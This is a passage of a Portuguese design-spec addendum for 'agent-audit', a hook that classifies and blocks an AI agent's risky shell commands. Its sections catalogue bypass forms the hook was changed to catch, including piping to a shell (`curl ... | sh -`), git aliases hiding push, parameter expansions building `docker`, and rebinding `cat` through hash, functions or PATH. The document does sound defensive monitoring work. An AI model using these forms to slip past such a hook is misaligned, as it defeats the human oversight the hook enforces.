**Testes.** `CodeEvaluationContexts` (`test_uncertainty.py`): `test_ps4_in_a_text_that_turns_tracing_on_is_dynamic_code`, `test_ps4_without_tracing_and_tracing_without_ps4_are_not`, `test_a_single_quoted_substitution_with_arithmetic_is_dynamic_code`, `test_a_substitution_that_does_not_reach_arithmetic_is_not_denied`; `test_a_word_that_evaluates_code_is_dynamic_code` (`ReviewFixB1`).

*Adendo 2026-11-14 (3):* a regra 1 lê só as palavras de shell (A23); a regra 3 ganha os contextos de subscrito `${!x}`, `${(P)x}` e `-v`, e as fontes de marca de valores conhecidos e de `read`/`mapfile` alimentados por heredoc ou here-string (A19), numa passada linear (A22); as suposições da Pergunta 11 foram confirmadas. Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A9 - Operandos de shell, builtins que avaliam string e orçamento (Design 1 X1, X3, X4, S10, P1, 4.3, 7)

**Motivo.** Achados: `echo 'git push' | bash -` e `curl ... | sh -` (o idioma comum de instalador) davam só o canário ou nada; `printf ... | xargs -0 sh -c` passava; `emulate sh -c STR` (zsh) e `mapfile -C STR` (bash) avaliam a string; a combinação de strings de código e valores passava de 1 s de CPU em 16 KB (falhava fechada só pelo watchdog).

**Regras.**

| Forma | Regra |
|---|---|
| `bash -`, `sh -`, ... | um `-` sozinho encerra as opções, como `--`; sem operando depois, o shell lê o stdin: X4 (`piped_shell`) num estágio que não é o primeiro, e a here-string é a string de código (`bash - <<< 'git push'`). `bash - script.sh` continua arquivo de script |
| `-c` sem operando sob `xargs` | a string de código vem do pipe em tempo de execução: `dynamic_code`, também atrás de wrappers na cadeia (`xargs env bash -c`, `xargs sudo sh -c`). Fora de `xargs` (`sh -c` sozinho), não roda nada e não é nível B |
| `emulate [-LR] [modo] -c STR` | `STR` é string de código (X1), também em cluster (`-LRc`); `STR` dinâmica é `dynamic_code`; `emulate -c` sem operando não roda nada |
| `mapfile`/`readarray -C STR` | `STR` é string de código, inclusive colada (`-C'x'`) e em cluster (`-tC`); dinâmica é `dynamic_code` |
| Orçamento (S10, P1) | cada texto analisado desconta `TEXT_COST` (128) e cada combinação de valores `VARIANT_COST` (64) do `Budget` compartilhado (`MAX_LEX_CHARS`), além dos caracteres; estouro é `analysis_budget`. O caso de 16 KB da revisão falha fechado em 0,19 s de CPU |

**Testes.** `ReviewFixB1`: `test_a_lone_dash_is_the_end_of_the_options_and_the_shell_reads_stdin`, `test_c_with_no_operand_under_a_feeder_is_dynamic_code`, `test_the_code_argument_table_has_emulate_and_mapfile`, `test_the_fan_out_of_values_and_code_texts_fails_closed_inside_the_cpu_budget`, `test_every_text_and_every_value_combination_is_charged`. SP8 e UN3/UN4 sem mudança.

### A10 - Receptores: here-strings, compostos, funções, lançadores e clientes SQL/DSL (Design 1 HD3, HD4, 4.2, 5; decisão do usuário sobre HD4)

**Motivo.** Achados: `{ bash; } <<< 'git push'`, `(bash) <<< ...`, `bash -c bash <<< ...`, `sh -c '. /dev/stdin' <<< ...`, `bash /dev/fd/3 3<<<...` e `exec 0<<<...; bash` passavam; `f() { git "$@"; }; f push` passava; falsos positivos novos contra `eee112a`: `uv run python - <<'EOF'`, `sqlite3 db <<'EOF'` com `select` e `BODY=$(cat <<'EOF' ...)` negados com `lex_error`; `_foreign_receiver` olhava só a leitura primária. Decisão do usuário: resolver os lançadores de intérprete e tratar clientes SQL/DSL como outra linguagem.

**Regras.**

1. **Here-strings** seguem as regras de receptor dos heredocs (HD3, HD4), com uma lista de leitores de dado: `jq yq grep egrep fgrep rg sed awk gawk cut sort uniq wc head tail tr bc base64 xxd od cmp diff comm join paste column fmt fold nl rev tac sha1sum sha256sum md5sum cksum read mapfile readarray expand unexpand` (toda leitura do receptor na lista). `sed`, `awk` e `gawk` com `-f`/`--file` de `-` ou `/dev/stdin` leem o programa do stdin: código. `cat` continua sink; um intérprete de outra linguagem não é lido; `dc` não é filtro. Qualquer outro receptor recebe a here-string como código. O heredoc mantém a regra estrita de HD4 (sem lista de leitores de dado).
2. **Compostos**: uma here-string num composto é código só quando há dentro um leitor de código: shell, `source`, `.`, `eval`, `xargs`, `su`, `sudo`, `env`, `at`, `batch`, `parallel`, `exec`, `ssh`, `script`, `coproc`, uma função do texto, um nome de programa dinâmico ou leituras incompletas. Um heredoc num composto continua sempre código (HD4). Leitores internos também contam (`bash -c bash`, `. /dev/stdin`, `/dev/fd/N`, `exec 0<<<` seguido de um shell).
3. **Texto que não se conhece**: uma here-string ou corpo cujo texto vem de uma expansão desconhecida (`"$x"`, um nome suave, `"$(cmd)"`) entregue a um leitor de código é nível B (`dynamic_code`); para dado (`cat`, `grep`, `jq`, `psql`), não. Corpos entregues a leitores de código são analisados com `code=True`.
4. **Funções que repassam argumentos**: uma função definida no texto cujo corpo usa parâmetros posicionais tem cada chamada classificada com o corpo em que `$@`, `$*` e `$N` viram os argumentos da chamada (um nível, até 16 chamadas; `$@` sem aspas divide as palavras). A definição em si, com um nome de programa feito de expansão, continua nível B (A7). Função que usa os argumentos só como dado não é achado.
5. **Lançadores** `uv`, `poetry`, `pdm`, `hatch`, `pipenv`, `rye`, `conda` seguidos de `run` são prefixos, com a gramática dos flags globais e dos flags de `run` de cada um; o programa depois deles é o receptor e a cabeça (`uv run python - <<EOF` é corpo Python; `uv run bash -c 'x'` é shell). Flag desconhecido: duas leituras (N3, `prefix_readings`). Sem `run`, o lançador é o comando. Os sete entram em `KNOWN_HEADS`. Suposição (Pergunta 11): `uv run python -m pytest` passa a ser `test-full`.
6. **Clientes SQL/DSL** `sqlite3`, `psql`, `mysql`, `mariadb`, `cypher-shell`: corpo e here-string são consulta, não shell (HD4), inclusive atrás de lançador. Nível B (`dynamic_code`) quando o texto pede ao cliente para rodar um comando: `.shell`, `.system` e `.once |` do sqlite3; `\!`, `\g |`, `\o |` e `\copy ... program` do psql; `system`, `pager` e `\!` do mysql. Vale para corpo, here-string e argumentos (`psql -c`, `mysql -e`, consulta posicional do `sqlite3`); sobre-aproximado.
7. **`NAME=$(cat <<'EOF' ... EOF)`**: um `cat` sozinho com delimitador entre aspas, numa substituição que é o valor inteiro de uma atribuição (também `"$(...)"`, `local`, `export`, prefixo de comando, `<<-`), é dado, e o corpo vira o valor da variável (chega a nome de programa e string de código: `$BODY` e `bash -c "$BODY"` são classificados, `eval "$BODY"` é nível B). Delimitador sem aspas: as expansões do corpo são analisadas (HD2) e o valor é desconhecido. `cat > f`, `cat -n`, pipe, `x$(...)` e `echo $(...)` continuam código.
8. **`_foreign_receiver`**: o receptor só é de outra linguagem quando toda leitura é (`sudo -x python3 bash <<EOF` lê o corpo como shell); com valores, todo valor precisa ser de outra linguagem, e a mistura de intérprete e cliente SQL vale como consulta.

**Fica fora** (log, B2; vai ao backlog pelo `backlog-keeper`): grupo ou subshell lendo um pipe (`echo 'git push' | { bash; }`), `!cmd` do `dc`, executores de configuração do git (`core.sshCommand`, `core.pager`, `core.editor`, `core.fsmonitor`) e `env:cmd` do hatch.

**Testes.** `ReviewFixB2` (`test_command_positions.py`): `test_a_here_string_on_a_compound_or_an_inner_reader_is_code`, `test_a_here_string_handed_to_data_is_not_read_as_code`, `test_a_here_string_that_a_filter_may_run_as_its_program_is_code`, `test_a_here_string_that_cannot_be_known_goes_to_a_reader_at_level_b`, `test_a_body_that_a_reader_runs_and_an_expansion_makes_is_level_b`, `test_a_heredoc_on_a_function_call_or_compound_keeps_the_receiver_rule`, `test_a_function_that_forwards_its_arguments_is_classified_with_the_call_arguments`, `test_a_function_that_forwards_is_level_b_whatever_the_call_is`, `test_a_function_that_only_uses_its_arguments_as_data_is_not_a_finding`, `test_the_positional_parameters_are_replaced_by_the_arguments`, `test_the_calls_of_forwarding_functions_are_bounded`, `test_an_interpreter_behind_a_launcher_is_a_foreign_receiver`, `test_a_shell_or_a_program_behind_a_launcher_still_classifies`, `test_a_launcher_without_run_is_the_command`, `test_the_flags_of_the_launchers_are_read_with_their_grammar`, `test_a_launcher_with_an_unknown_flag_reads_the_body_as_shell`, `test_a_launched_python_test_run_is_a_test_run`, `test_a_query_client_reads_its_body_as_a_query`, `test_a_query_that_asks_the_client_to_run_a_command_is_level_b`, `test_a_plain_query_argument_is_not_an_escape`, `test_the_receiver_is_foreign_only_when_every_reading_is`, `test_a_lone_cat_heredoc_that_is_a_whole_assignment_value_is_data`, `test_a_cat_heredoc_that_is_not_a_whole_assignment_value_stays_code`, `test_a_cat_value_that_reaches_a_head_or_a_code_string_is_classified`.

*Adendo 2026-11-14 (3):* a regra 4 foi revisada (decisão do usuário: a definição sozinha passa, nível B só para chamada que não se resolve; A24, e `test_a_function_that_forwards_is_level_b_whatever_the_call_is` virou `..._only_when_a_call_cannot_be_resolved`); a regra 5 ganha `hatch env run`, `uv run -p`, `mamba`, `micromamba` e `pixi` (A21); a regra 6 ganha os escapes de A20; funções, `hash`, `enable -f` e `PATH` que religam um receptor tiram as isenções (A15); as suposições da Pergunta 11 foram confirmadas. Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A11 - Aliases do git e formas do docker (Design 4.5; lacunas de `eee112a`, decisão do usuário de incluir)

**Motivo.** Achados de segurança anteriores a esta spec: `git -c alias.p=push p` e `git -c alias.c=commit c -m x` escondiam push e commit da regex e do canário; `docker --context x restart y`, `docker -H h restart y`, `docker container restart y`, `docker compose --project-directory d down` e `docker compose --ansi never down` passavam.

**Regras.**

1. **Aliases do git**: definidos por `-c alias.NOME=VALOR`, `--config-env=alias.NOME=VAR` (o valor vem dos valores conhecidos de `VAR`), `GIT_CONFIG_COUNT` com `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n`, e `GIT_CONFIG_PARAMETERS` (em atribuições de prefixo e em valores do texto, inclusive `export`). A chamada do alias é classificada como a expansão dele, com os argumentos restantes; o nome do alias não diferencia caixa; cadeias de aliases até profundidade 5 (`_GIT_ALIAS_DEPTH`). Um alias com `!` é código de shell (X1, com as palavras seguintes). Alias que não se resolve (chave ou valor dinâmico, contagem sem par de chave e valor) é nível B (`dynamic_code`). Configuração que não é alias (`-c user.name=x`, `-c core.pager=cat`) não é achado. O subcomando continua achado como em A2, agora por `_git_walk`.
2. **Docker**: as opções globais (`--context`, `-H`/`--host`, `--config`, `--log-level`, `-D`, `--tls` e as demais) são puladas com a gramática de valor de cada uma; `container VERBO` e `image build` valem como as formas curtas; as opções do compose (`-p`/`--project-name`, `-f`, `--project-directory`, `--ansi`, `--profile`, `--env-file`, `--parallel`, `--progress`, `--dry-run` e outras) são puladas; `docker-compose` vale como `docker compose`. Opção desconhecida: lida dos dois jeitos (`prefix_readings`), até `MAX_DOCKER_FORMS` (4) formas. Leitura (`docker-read`) e build (`docker_build`) passam pelas mesmas opções. Verbo dinâmico depois de uma palavra de gerenciamento é nível B (A6).

**Testes.** `ReviewFixB2`: `test_a_git_alias_given_on_the_command_line_is_the_command_it_expands_to`, `test_a_git_alias_that_cannot_be_known_is_level_b`, `test_git_configuration_that_is_not_an_alias_is_not_a_finding`, `test_the_git_walk_finds_the_subcommand_and_the_configuration`, `test_docker_global_options_and_management_commands_classify_like_the_short_forms`, `test_docker_reads_and_builds_through_the_same_options`, `test_a_docker_option_that_is_not_known_is_read_both_ways`, `test_a_dynamic_verb_after_a_management_word_is_level_b`, `test_the_docker_forms_are_bounded`. GC1 sem mudança.

*Adendo 2026-11-14 (3):* regra 1: o valor do alias é dividido como `split_cmdline` e `GIT_CONFIG_PARAMETERS` é lido nas duas formas (A17); regra 2: clusters de opções curtas lidos como o pflag, `MAX_DOCKER_FORMS` 8 e formas acima do teto em `readings_cap`, sem truncar (A14). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A12 - Canário de `xargs`, `parallel` e `find -exec` (Design 4.2, 8)

**Motivo.** Achado: `echo restart x | xargs docker` e `echo push | xargs git` não registravam nada, e o teste de lacuna travava a ausência de flag em vez de afirmar o registro do canário de que a seção 8 depende.

**Regra.** Um `docker` ou `git` alcançado por `xargs`, `parallel` ou `find -exec` sem verbo literal no mesmo comando simples registra `deny_token_unmatched` (nível A, só registro). Esses programas continuam fora da tabela de wrappers (decisão do usuário 5); o canário fica quieto quando nada é alimentado (`xargs echo`, `echo docker | cat`).

**Testes.** `ReviewFixB2`: `test_the_canary_sees_a_program_reached_through_xargs_without_a_literal_verb`, `test_the_canary_is_quiet_when_nothing_is_fed`; `WrappersAndProgramNames.test_the_programs_left_out_of_the_table_are_not_wrappers_but_the_canary_records_them` (agora afirma o canário). Ajustes de teste da mesma rodada: `test_the_wrapper_search_stays_linear` conta as chamadas de `_flag_step`; a metade do hook de SP5 ganhou as composições de dois níveis com envoltórios de string.

*Adendo 2026-11-14 (3):* o canário lê também as palavras decodificadas (A21). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A13 - Layout dos módulos: o classificador em `agent_audit_classify.py` (Design 1 P2, 4.1, 7; decisão do usuário, parte C)

**Motivo.** O processo do hook estava 10,6 ms acima de `eee112a` (orçamento: +3 ms, seção 7), porque `agent-audit.py` compilava cerca de 2.800 linhas (4.178 depois das partes A e B) a cada chamada. O usuário decidiu mover o classificador agora, sem esperar a spec do lançador.

**Seção 4.1 revisada.**

- `agent_audit_classify.py` (3.263 linhas) tem `analyze_command(command, _depth=0, _env=None, _budget=None, _code=False)`, `classify_command`, as leituras, wrappers, código, valores, heredoc, `_classify_segment` e os limites `MAX_*` e regexes de teste, lint, docker e URL. `agent-audit.py` (1.118 linhas) mantém a política (config, decisão, registro, watchdog) e chama `_classifier().analyze_command(cmd)`.
- Um carregador só, por caminho, com bytecode em cache:

```python
def _load_module(name: str):
    """<name>.py next to this file, through the source loader (bytecode cached in __pycache__ when the interpreter
    may write it), registered in sys.modules while it runs. Returns (module, None) or (None, error name); never raises."""

def _load_classifier():
    """agent_audit_shell, then agent_audit_classify: (classifier, None) or (None, error name of the first failure)."""

classifier, _CLASSIFIER_ERROR = _load_classifier()   # at import, before any fork

def _classifier():
    """The classifier module; a load failure raises RuntimeError("classifier module: <name>")."""
```

- O classificador importa o parser pelo nome (`import agent_audit_shell as shell`), registrado em `sys.modules` pelo carregador; parser ausente deixa o classificador sem carregar. O carregador usa `_frozen_importlib` e `_frozen_importlib_external` (sempre carregados pelo CPython) e cai para `importlib.util` só se faltarem, para evitar cerca de 0,7 ms de import.
- **Falha fechada**: módulo ausente, com erro de sintaxe ou que levanta no import (qualquer um dos dois), ou classificador que levanta ao ser chamado: todo Bash é negado com `classifier_error`, só com o nome do erro registrado; escritas e ferramentas visuais seguem normais.
- Divisões sem mudança de comportamento (comparadas por AST com o texto anterior): `analyze_command` com 43 linhas (classe `_Run`), `_known_values` com 14 (`_ValueScan`), `_arg_variants` 29, `_quoted_reaches_arithmetic` 11; a maior função tem 51 linhas.

**P2 revisado** (texto novo no lugar, seção 1): os dois módulos não fazem I/O, não iniciam processo e não chamam código dinâmico; o parser importa só `re` e `__future__` e não guarda estado global mutável; o classificador importa só `re`, `functools`, `collections`, `__future__` e o parser, e pode ter tabelas no nível do módulo (dicts e sets, só leitura por convenção) e caches `functools.lru_cache` de funções puras; nenhum dos dois importa o hook nem `typing` (A4). A linha BIO11 da Testing deixou de citar `typing` (o teste ainda o aceita: Pergunta 8).

**Latência medida** (log, parte C; PreToolUse `pytest tests/test_a.py`, 60 execuções intercaladas, carga 5-7 em 4 núcleos): `eee112a` mediana 89,2 ms; antes da parte C 126,8 ms; depois 70,4 ms, cerca de 19 ms mais rápido que `eee112a` e dentro do aumento de até 3 ms da seção 7. A primeira execução fria leva 155 ms (grava os dois `.pyc`); um segundo lote de 60 manteve a ordem. A carga de cada módulo do cache não foi medida em separado nesta parte (Pergunta 13). Check manual: repetir `scratchpad/c/bench.py 40 eee before after` numa máquina ociosa.

**Proteção do hook.** A seção 9 já pede que a proteção dos arquivos do hook cubra o módulo do parser; agora cobre também `agent_audit_classify.py`. Não existe ainda regra de autoproteção para estender (bug aberto [hook self-protection](../../backlog/bugs/2026-11-11-audit-hook-self-protection.md)).

**Testes.** Os testes chegam ao módulo por `_support.classifier`. UN16 (`ShellModuleLoad`, `test_uncertainty.py`) ganha os casos do classificador: ausente, com erro de sintaxe, que levanta no import, que levanta ao ser chamado, e classificador sem o parser. BIO12 (`ClassifierModuleInvariant`, `test_bounded_io.py`): imports permitidos, nenhum nome `sys`/`os`/`io`/`subprocess`/`pathlib`, nenhuma chamada de arquivo, processo ou código dinâmico, nenhum `global`, nenhum import do hook; tabelas de módulo permitidas. P-SL4 (`ShellParserProcess`, `test_hook_process.py`) confere os dois caches de bytecode e a recompilação depois de mudar o fonte. Regras -> testes: P2 passa a BIO11 e BIO12; a carga falha fechada, UN16 e P-SL4.

*Adendo 2026-11-14 (3):* o carregador passou a usar `.pyc` com hash conferido e a capturar `BaseException` no import (Pergunta 9, opção (a); A25); BIO11 sem `typing` (A26); só o orçamento do processo vale (Pergunta 13, opção (b)). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### Perguntas 8-13 (decididas pelo usuário em 2026-11-14)

*Adendo 2026-11-14 (3):* decididas pelo usuário em 2026-11-14, todas como recomendado: 8 (a), 9 (a), 10 (a), 11 (a), 12 (a), 13 (b); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), "Perguntas 7-13 (decididas)". O texto abaixo fica como registro.

8. **BIO11 ainda aceita `typing`.** O teste (`ShellModuleInvariant.ALLOWED_IMPORTS` e o exemplo "good") permite `typing`, e A4 o deixou assim; P2 e a linha BIO11 agora não o citam. Opções: (a) tirar `typing` do teste numa task futura de testes, alinhando BIO11 a P2; (b) manter o teste e checar na revisão, como A4 disse. Recomendação: (a). A restrição vira verificável e o teste deixa de divergir da regra; custo de uma linha.
9. **`.pyc` por hash.** O cache do carregador é validado por `mtime` e tamanho, então uma edição do mesmo tamanho no mesmo segundo pode servir bytecode velho (só em desenvolvimento). Opções: (a) `.pyc` com hash conferido no carregador (cerca de 12 linhas, 0,08 ms por chamada, medido na parte C); (b) deixar como está; (c) levar para a spec do lançador. Recomendação: (a). Fecha um caso de correção do próprio hook por um custo medido e pequeno; o log deixou a escolha ao usuário.
10. **Testes no nível do hook para as formas de A5.** `$=NAME` no nome de programa, `A=<(true) docker restart x`, heredoc pendente em `[[ ]]`, `[[ -n <(cmd) ]]`, o delimitador `$'E\x4fF'` e `repeat N {` só têm teste no parser; conferidos em processo nesta revisão, o hook dá o resultado esperado (`docker_lifecycle`, `git_push`, `lex_error` ou `dynamic_code`). Opções: (a) acrescentá-los a `test_command_positions.py` numa task futura; (b) deixar como está. Recomendação: (a). Uma mudança no classificador pode perder a forma sem que o teste do parser falhe.
11. **Suposições da implementação a confirmar.** B1b: `[`/`test` numéricos como `[[ ]]`; `awk '{a[$(NF)]}'` e programas parecidos não negados. B2: a lista de leitores de dado da here-string (A10, regra 1); `uv run python -m pytest` como `test-full`. Opções: (a) confirmar como estão; (b) revisar uma a uma. Recomendação: (a). Todas seguem o princípio (nenhum allow silencioso de forma bloqueada; a here-string fora da lista continua código), e o replay não mostrou caso contrário.
12. **`cd x && BIN=$(...); $BIN` continua nível B.** A atribuição da cadeia `&&` vale só até o fim dela, então o uso depois do `;` mantém o ambiente como candidato. Opções: (a) manter; (b) aceitar a atribuição de uma cadeia `&&` de nível de cima como valor depois dela quando o único valor é uma substituição (nome suave). Recomendação: (a). Se o `cd` falha, `BIN` fica com o valor do ambiente, então (a) é a semântica exata; o caso apareceu uma vez no replay e tem saída fácil (`&& $BIN` na mesma cadeia).
13. **Orçamento de carga do classificador.** A seção 7 fixa "carregar `agent_audit_shell` com bytecode em cache: até 1 ms" e nada para o classificador; a parte C mediu só o processo. Opções: (a) uma linha nova na tabela da seção 7 (carga do classificador do cache, valor a medir) e medição no próximo check de latência; (b) só o orçamento do processo vale para os dois módulos. Recomendação: (b). O processo é o que o usuário sente e já está 19 ms abaixo de `eee112a`; um teto por módulo acrescenta medida sem proteger nada a mais.

## Adendo 2026-11-14 (3) - rodada final

- **Origem**: a segunda revisão (`code-reviewer` e `security-reviewer`, os dois com "fix first"; nenhuma sonda executou programa, só funções Python e JSON sintético do hook) confirmou as correções da primeira rodada, salvo três parciais (brace heads com aspas, aliases do git com valor entre aspas, formas do docker acima do teto), e achou formas novas que falham abertas (segurança H1-H4 e M1-M4, código majors 1-3), menores (L1, L2 e outros), o falso positivo do PS4 em strings de `python -c` e o carregador deixando passar `BaseException` no import. Decisão do usuário (2026-11-14, fechamento): uma rodada final para todos os achados altos, médios e majors, os menores baratos, o falso positivo do PS4 e o carregador; depois, uma verificação de segurança estreita só desses itens; o que aparecer de novo vai ao backlog e a feature fecha. A rodada correu em duas partes, D2 (carregador e testes) e D1 (classificador e parser); o detalhe (comandos, replay, medidas) fica no [log.md](log.md), blocos "Second review", "User decisions (2026-11-14, closing)", "Fix part D2" e "Fix part D1".
- **Afeta**: Design, seções 1 (N1, N6, X3, HD3, HD4, P2), 2.1, 2.4, 4.1, 4.2, 4.4, 4.5, 5 e 7; Testing (BIO11, testes novos, Regras -> testes); Open questions; Adendo 2026-11-14 (A4, Pergunta 7); Adendo 2026-11-14 (2) (A5, A6, A7, A8, A10, A11, A12, A13, Perguntas 8-13). O **Status** da spec e das tasks não muda, e nenhuma task nova entra. O texto anterior fica como registro, salvo a linha BIO11 da Testing, corrigida no lugar e marcada; as outras seções afetadas ganham só uma nota que aponta para cá. Onde divergir, vale este adendo.
- **Não muda**: os níveis A e B e os motivos (nenhum motivo novo: as negações novas usam `readings_cap`, `dynamic_code` e `analysis_budget`); `MAX_READINGS`, `MAX_VALUE_CANDIDATES`, `MAX_CODE_ARGS`, `MAX_CODE_DEPTH`; o canário como registro; `agent-audit.json` e `settings.json`.
- **Resultado medido** (log, D2 e D1): suite 804 testes OK (12,4 s). Replay de 14.194 comandos, com a base da parte C rodada de novo no mesmo corpus: E1 244 / 190 (igual), E2 102 / 65 -> 108 / 68 (3 escritas de arquivo das sondas da revisão deixaram de ser negadas), E3 58 / 29 -> 46 / 23 (nenhum comando novo; saem os falsos positivos do PS4 e das funções que repassam), E4 0; `analyze_command` mediana 0,385 ms, p99 2,70 ms. Processo do hook (50 execuções intercaladas, carga 3,85): `eee112a` mediana 88,1 ms, depois de D2 71,7 ms (fria 153,7 ms). **Gate final** (depois da parte E, A28): suite 811 testes, 3 execuções verdes, 9,9-11 s; replay de 14.281 comandos: E1 244 / 190, E2 114 / 71, E3 46 / 23, E4 0.
- **Depois desta rodada**: a verificação de segurança estreita dos itens A14-A27 (Verification 6: só binários stub, conferidos antes de cada execução; nenhum programa real). Achado novo vai ao backlog pelo `backlog-keeper`, sem nova rodada nesta spec. A verificação correu e achou variantes parciais V1-V5; por decisão do usuário, elas foram corrigidas numa mini-rodada (parte E, A28), sem nova revisão.

### A14 - Docker: clusters de opções curtas e teto de formas (H1; revisa A11, regra 2)

**Motivo.** `docker -Dl info restart x` lia `-Dl` como opção desconhecida, nas duas leituras, e com opções desconhecidas suficientes `MAX_DOCKER_FORMS` (4) cortava a lista de formas: a forma real podia estar entre as descartadas (`docker` seguido de dez `-x aN` e de `$'\x72estart' x` não dava achado).

**Regras.**

1. Um cluster de opções curtas (`-Dl`, `-lcrit`, `-Dlcrit`, `-vD`, `-Dc ctx`) é lido como o pflag o lê (`_option_ends`): letra booleana (`D`, `v`, `h`) segue para a próxima letra; letra de valor (`c`, `H`, `l`) toma o resto da palavra (`-Hhost`, `-l=info`) ou, no fim do cluster, a palavra seguinte (`-Dl info`); letra desconhecida, as duas leituras. Vale para as opções globais do docker e as do compose. `docker -Dl info -Dl info restart x` tem uma leitura só.
2. `MAX_DOCKER_FORMS` passa de 4 para 8. Acima disso nada é truncado: `_FormsCap` faz a leitura ser `readings_cap` (nível B, `Readings.complete` falso, sem canário), o mesmo motivo de `MAX_READINGS` (N1).

**Testes.** `ReviewFixD1` (`test_command_positions.py`): `test_h1_docker_short_option_clusters_are_read_like_pflag_reads_them`, `test_h1_docker_forms_over_the_cap_are_level_b_not_truncated`; `LevelBReasonsD1` (`test_uncertainty.py`, caso `readings_cap`). `test_the_docker_forms_are_bounded` (A11) continua.

### A15 - Nomes de receptor religados: funções, `hash`, `enable -f` e `PATH` (H2, H3; estende A1, A10 e os desqualificadores da seção 5)

**Motivo.** As regras de dado confiam no nome do receptor: sink (`cat`, `tee`, `git`, `gh`), leitor de dado da here-string (A10, regra 1), intérprete de outra linguagem, cliente SQL/DSL. `jq() { bash; }; jq <<< 'git push'`, `hash -p /bin/bash cat; cat <<'EOF' ...`, zsh `hash cat=/bin/bash`, `enable -f x.so cat` e `PATH=/tmp/x:$PATH; cat <<EOF` fazem o nome rodar outro programa, e o corpo passava como dado. O desqualificador de script inteiro da seção 5 só pegava função com nome de sink.

**Regra** (`_rebound_spans`, calculado quando o texto contém `<<`, o que inclui as here-strings). Cada religamento dá um trecho do texto (intervalo de posições); um comando que começa no trecho tem todo corpo de heredoc e toda here-string lidos como código (HD4), sem as isenções de sink, de leitor de dado, de outra linguagem e de consulta:

| Religamento | Trecho |
|---|---|
| função cujo nome (último componente) é sink, leitor de dado, intérprete de outra linguagem (`python*` incluído) ou cliente SQL/DSL | da definição ao fim do texto |
| `hash` com `-p` (`hash -p CAMINHO NOME`) ou com `NOME=CAMINHO` (zsh); `enable -f` | do comando ao fim do texto |
| atribuição a `PATH` ou ao `path` do zsh, sozinha ou por `export`/`declare`/`typeset`/`local`/... (`=` ou `+=`) | do comando ao fim do texto |
| `PATH=x cmd` (atribuição de prefixo de um comando) | só o próprio comando |

Limites: um religamento dentro de laço (`for`, `while`, `until`, `select`) vale desde o início do texto (o laço pode rodá-lo antes dos comandos escritos antes dele); dentro de subshell, até o fim do subshell; num estágio de pipeline com mais de um estágio, só o próprio comando; dentro de substituição, até o fim dela. Comandos antes do religamento mantêm os nomes; `hash -r` e `hash` sem `-p` nem `=` não religam nada.

**Escopo.** Só as decisões de dado de heredoc e here-string usam os trechos. A classificação pelo nome de programa não muda: um `docker` religado continua classificado como `docker`, o que já nega. `PATH=/x ./mvnw verify` antes de um heredoc Python, ou `export PATH=...` depois dele, não muda o heredoc.

**Testes.** `ReviewFixD1`: `test_h2_a_function_named_like_a_reader_or_a_sink_loses_the_data_exemption`, `test_h3_hash_enable_and_path_disqualify_the_data_exemptions`, `test_h3_a_rebinding_covers_only_the_commands_it_reaches`.

### A16 - Operadores de parâmetro no nome de programa e `/` dentro de `${...}` (H4, major 1 do código; estende A6 e A7)

**Motivo.** `${PWD:+docker} restart x`, `${R:-docker} restart x` e `X=lsocker; "${X/ls/d}" restart y` rodam `docker`. O hook tratava a cabeça como nome que só vem do ambiente (nível A) ou, com `/` dentro da expansão, como caminho de último componente literal (`d}`), sem achado.

**Regras.**

1. **Operadores** (`_operator_texts`, `_param_candidates`): numa cabeça feita de expansões com operador, cada `${...}` dá candidatos e cada combinação (até `MAX_VALUE_CANDIDATES`, 16) é classificada como uma leitura:

| Forma | Candidatos |
|---|---|
| `${N-w}`, `${N:-w}`, `${N=w}`, `${N:=w}` | a palavra `w` e os valores conhecidos de `N` |
| `${N+w}`, `${N:+w}` | `w` e o vazio (a expansão pode sumir; `${NOPE:+} docker restart y` lê `docker`) |
| `${N/pad/rep}`, `${N//pad/rep}`, `${N/#pad/rep}`, `${N/%pad/rep}` | `rep`, os valores conhecidos e, com padrão literal, os valores com a troca aplicada |
| `${N}`, `${N?w}`, `${N:?w}`, `${#N}` | nenhum além do valor (`${#N}` é comprimento, nunca programa) |
| outro operador (`%`, `#` de corte, `^^`, `,,`, `:off:len`, `@Q`, ...), indireção `${!N}`, flags do zsh, subscrito; ou `$`, crase, aspas, chaves ou parênteses na palavra ou no padrão | não se conhece: nível B (`dynamic_code`) |

Vale também com parâmetros posicionais (`${1:-docker}`), entre aspas (`"${NOPE:-docker}"`) e com diretório antes (`/usr/bin/${A:-git} push`). Um nome feito de expansão sem operador segue A7 (o ambiente sozinho continua nível A).

2. **`/` dentro de `${...}` ou `$(...)`** é da expansão, nunca separador de caminho (`_path_tail`): `${X/ls/d}`, `${X%/*}` e `"${A//\//-}"` não nomeiam o programa pelo texto depois da barra. Vale para palavras e para valores (`Y=${X/ls/d}; $Y restart y`). `${HOME}/bin/tool` e `${X:-/usr/bin}/ls` continuam nomeando o programa pelo último componente literal (N2), sem nível B.

**Testes.** `ReviewFixD1`: `test_h4_the_operator_word_of_a_head_expansion_is_classified`, `test_h4_a_head_operator_that_cannot_be_known_is_level_b`, `test_major1_a_slash_inside_an_expansion_is_not_a_path_separator`; `LevelBReasonsD1`.

### A17 - Aliases do git: valores divididos como o git e as duas formas de `GIT_CONFIG_PARAMETERS` (M1, major 3; revisa A11, regra 1)

**Motivo.** `git -c "alias.p='push'" p`, `git -c "alias.p=pu''sh" p` e `git -c alias.p="p"ush p` passavam: o valor do alias era dividido nos brancos sem tirar as aspas, e `push` não aparecia. `GIT_CONFIG_PARAMETERS="'alias.p'='push'"` (forma do git 2.31 em diante) não era lido.

**Regras.**

1. O valor de um alias sem `!` é dividido como o `split_cmdline` do git (`_split_cmdline`): brancos separam palavras; `'...'`, `"..."` e a barra invertida agrupam, e as aspas saem. Aspas ou escape que não fecham, e barra invertida dentro de aspas simples (leitura incerta entre versões do git), não se conhecem: nível B (`dynamic_code`).
2. `GIT_CONFIG_PARAMETERS` é lido como o `parse_config_env_list` do git (`_config_parameters`): itens separados por branco, cada um `'chave=valor'` (forma antiga) ou `'chave'='valor'`/`'chave'` (forma nova), com `'\''` e `'\!'` para a aspa embutida (`sq_dequote_step`). Um item que não analisa torna a configuração desconhecida: nível B.

